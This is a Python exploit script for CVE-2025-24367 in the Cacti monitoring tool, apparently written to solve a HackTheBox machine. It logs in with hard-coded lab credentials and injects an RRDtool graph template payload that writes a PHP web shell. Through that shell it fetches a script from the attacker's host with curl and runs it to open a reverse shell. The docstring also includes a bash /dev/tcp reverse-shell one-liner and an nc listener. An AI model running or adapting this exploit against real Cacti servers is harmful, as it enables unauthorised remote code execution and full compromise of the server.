#!/usr/bin/env python3
"""CVE-2025-24367 - Cacti RCE via Graph Template Injection
Tested working on MonitorsFour HackTheBox

Setup before running:
    echo '#!/bin/bash
    bash -i >& /dev/tcp/YOUR_IP/4455 0>&1' | sudo tee /var/www/html/bash
    sudo systemctl start apache2
    tmux new-session -d -s shell "nc -lvnp 4455"

Then: python3 exploit_working.py
Access shell: tmux attach -t shell
"""
import requests
import re
import sys

# CONFIG - Change these
LHOST = "10.10.16.10"  # Your tun0 IP
LPORT = "4455"
URL = "http://cacti.monitorsfour.htb"

s = requests.Session()

# Login
print("[*] Logging in as marcus...")
r = s.get(f'{URL}/cacti/index.php')
match = re.search(r'csrfMagicToken\s*=\s*"([^"]+)"', r.text)
if not match:
    print("[-] Failed to get CSRF token. Is the target up?")
    sys.exit(1)

csrf = match.group(1)
r = s.post(f'{URL}/cacti/index.php', data={
    '__csrf_magic': csrf, 'action': 'login',
    'login_username': 'marcus', 'login_password': 'wonderful1'
})

if 'logout' not in r.text.lower() and 'logged' not in r.text.lower():
    print("[-] Login failed")
    sys.exit(1)
print("[+] Logged in as marcus")

# Inject webshell via RRDtool graph template
print("[*] Injecting webshell payload...")
r = s.get(f'{URL}/cacti/graph_templates.php?action=template_edit&id=226')
csrf = re.search(r'csrfMagicToken\s*=\s*"([^"]+)"', r.text).group(1)

# Payload creates shell.php with command execution via $_REQUEST[0]
rrdtool = """XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`$_REQUEST[0]`;?>
"""

data = {
    "__csrf_magic": csrf, "name": "Unix - Logged in Users",
    "graph_template_id": "226", "graph_template_graph_id": "226",
    "save_component_template": "1", "right_axis_label": rrdtool,
    "title": "|host_description| - Logged in Users", "vertical_label": "users",
    "image_format_id": "3", "height": "200", "width": "700", "base_value": "1000",
    "slope_mode": "on", "auto_scale": "on", "auto_scale_opts": "2", "action": "save"
}

s.post(f'{URL}/cacti/graph_templates.php?header=false', data=data)

# Trigger graph generation to create the PHP file
s.get(f'{URL}/cacti/graph_json.php?rra_id=0&local_graph_id=3')
print("[+] Webshell created at /cacti/shell.php")

# Test webshell
r = s.get(f'{URL}/cacti/shell.php?0=id')
if 'www-data' in r.text:
    output = r.text.split('"')[3].strip() if '"' in r.text else r.text
    print(f"[+] RCE confirmed: {output}")
else:
    print("[-] Webshell test failed")
    sys.exit(1)

# Download reverse shell script from our Apache server
print(f"[*] Downloading shell script from http://{LHOST}/bash ...")
s.get(f'{URL}/cacti/shell.php?0=curl%20{LHOST}/bash%20-o%20/tmp/s.sh')

# Verify download
r = s.get(f'{URL}/cacti/shell.php?0=cat%20/tmp/s.sh')
if '/dev/tcp' in r.text:
    print("[+] Shell script downloaded successfully")
else:
    print("[-] Shell script download failed. Check Apache is serving /var/www/html/bash")
    sys.exit(1)

# Trigger reverse shell
print("[*] Triggering reverse shell...")
try:
    s.get(f'{URL}/cacti/shell.php?0=bash%20/tmp/s.sh', timeout=2)
except requests.exceptions.Timeout:
    pass
except Exception as e:
    pass

print(f"""
[+] Done! Check your listener:
    tmux attach -t shell

Expected output:
    connect to [{LHOST}] from (UNKNOWN) [10.10.11.98] ...
    www-data@821fbd6a43fa:~/html/cacti$
""")
